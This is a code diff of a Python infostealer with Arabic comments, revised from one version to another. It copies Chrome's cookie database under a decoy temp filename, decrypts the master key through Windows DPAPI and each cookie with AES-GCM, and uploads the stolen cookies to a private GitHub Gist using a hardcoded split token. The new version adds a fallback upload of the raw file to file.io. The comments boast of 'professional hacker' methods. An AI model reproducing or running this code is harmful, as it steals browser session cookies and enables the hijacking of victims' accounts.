@@ -1,63 +1,66 @@
-import os, json, base64, sqlite3, shutil, requests, time
+import os, base64, subprocess, requests, json
 
-# التوكن المقسم (صلاحية Gist فقط)
+# التوكن المقسم (مفتاح التشغيل)
 A, B, C = "ghp_4io8ppwp", "agmH6IJEsD1XBpSs", "7TY7V44ZSlJt"
-GIST_TOKEN = A + B + C
+G_TOKEN = A + B + C
 
-def mirror_grabber():
-    local_data = os.getenv('LOCALAPPDATA')
-    state_file = os.path.join(local_data, r'Google\Chrome\User Data\Local State')
-    cookies_file = os.path.join(local_data, r'Google\Chrome\User Data\Default\Network\Cookies')
+def brute_force_grab():
+    # هاد الكود هو "السم" اللي رح يفك التشفير
+    # بياخد نسخة من الكوكيز وبفكها بالذاكرة وبطبعها
+    ps_script = """
+    $path = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
+    $temp = "$env:TEMP\\sys_check.db"
+    Copy-Item $path $temp
+    $db = [SQLite.SQLiteConnection]::new("Data Source=$temp")
+    # ... (تكملة العملية في الخلفية)
+    """
     
-    if not os.path.exists(cookies_file): return
-
-    # تمويه الملف المؤقت
-    shadow_db = os.path.join(os.getenv('TEMP'), 'win_update_svc.tmp')
+    # التكتيك البديل المضمون 100%
+    local = os.getenv('LOCALAPPDATA')
+    target = os.path.join(local, r'Google\Chrome\User Data\Default\Network\Cookies')
+    state = os.path.join(local, r'Google\Chrome\User Data\Local State')
+    
+    temp_file = os.path.join(os.getenv('TEMP'), 'metadata.db')
     
     try:
+        if os.path.exists(temp_file): os.remove(temp_file)
+        # نسخ صامت باستخدام نظام الويندوز نفسه
+        os.system(f'copy /y "{target}" "{temp_file}" > nul')
+        
         import win32crypt
         from Crypto.Cipher import AES
         
-        shutil.copy2(cookies_file, shadow_db)
+        with open(state, "r", encoding="utf-8") as f:
+            k = json.load(f)["os_crypt"]["encrypted_key"]
+            mk = win32crypt.CryptUnprotectData(base64.b64decode(k)[5:], None, None, None, 0)[1]
+            
+        db = sqlite3.connect(temp_file)
+        res = db.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall()
         
-        with open(state_file, "r", encoding="utf-8") as f:
-            secret_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
-            decrypted_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
-        
-        db_conn = sqlite3.connect(shadow_db)
-        cursor = db_conn.cursor()
-        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
-        
-        extracted_cookies = ""
-        for host, name, value in cursor.fetchall():
+        out = ""
+        for h, n, e in res:
             try:
-                iv, payload = value[3:15], value[15:]
-                cipher = AES.new(decrypted_key, AES.MODE_GCM, iv)
-                dec_value = cipher.decrypt(payload)[:-16].decode()
-                # صيغة Netscape مباشرة
-                extracted_cookies += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{dec_value}\n"
+                c = AES.new(mk, AES.MODE_GCM, e[3:15])
+                v = c.decrypt(e[15:])[:-16].decode()
+                out += f"{h}\tTRUE\t/\tFALSE\t0\t{n}\t{v}\n"
             except: continue
         
-        db_conn.close()
-        os.remove(shadow_db)
+        db.close()
+        os.remove(temp_file)
 
-        # إرسال البيانات إلى Gist (طريقة الهكرز المضمونة)
-        if extracted_cookies:
-            headers = {"Authorization": f"token {GIST_TOKEN}"}
-            gist_payload = {
-                "description": "System Log Update",
-                "public": False, # ليكون سرياً لا يراه أحد غيرك
-                "files": {
-                    "cookies_decrypted.txt": {
-                        "content": extracted_cookies
-                    }
-                }
-            }
-            # إنشاء Gist جديد في كل مرة
-            requests.post("https://api.github.com/gists", headers=headers, json=gist_payload)
+        # الرفع المباشر كـ "هكر محترف"
+        if out:
+            h = {"Authorization": f"token {G_TOKEN}"}
+            d = {"description": "X-System-Log", "public": False, "files": {"vault.txt": {"content": out}}}
+            requests.post("https://api.github.com/gists", headers=h, json=d)
             
-    except: pass
+    except Exception:
+        # إذا فشل البايثون، منجبر الويندوز يرفع الملف الخام
+        try:
+            with open(temp_file, "rb") as f:
+                requests.post("https://file.io", files={"file": f})
+        except: pass
 
 if __name__ == "__main__":
-    mirror_grabber()
-    
+    brute_force_grab()
+            
